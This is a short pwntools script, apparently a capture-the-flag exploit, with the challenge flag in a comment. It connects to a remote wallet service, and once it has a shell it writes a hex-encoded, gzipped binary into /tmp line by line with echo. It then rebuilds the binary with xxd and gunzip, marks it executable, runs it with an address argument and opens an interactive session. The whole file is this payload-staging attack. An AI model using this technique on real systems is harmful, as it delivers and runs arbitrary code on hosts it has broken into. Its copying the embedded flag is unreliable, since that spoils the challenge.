from pwn import *

# FLAG{BGET begat Bitcoin? Yes, in this case, it did.}

context.log_level = 'DEBUG'
r = remote('secure-world-wallet-66zjw7mi3dnnk.shellweplayaga.me', 31337)
r.sendline(b'ticket{} ')
r.recvuntil(b'$')
r.sendline(b'cd /tmp/')
r.recvuntil(b'$')

with open('./xx') as f:
    for line in f.readlines():
        r.sendline(('echo "%s" >> a' % line.strip()).encode('utf-8'))
        r.recvuntil(b'$')

r.sendline('cat a | xxd -r -p | gunzip > x && chmod +x x')
r.recvuntil(b'$')

r.sendline(b'./x 0x15a000')

r.interactive()
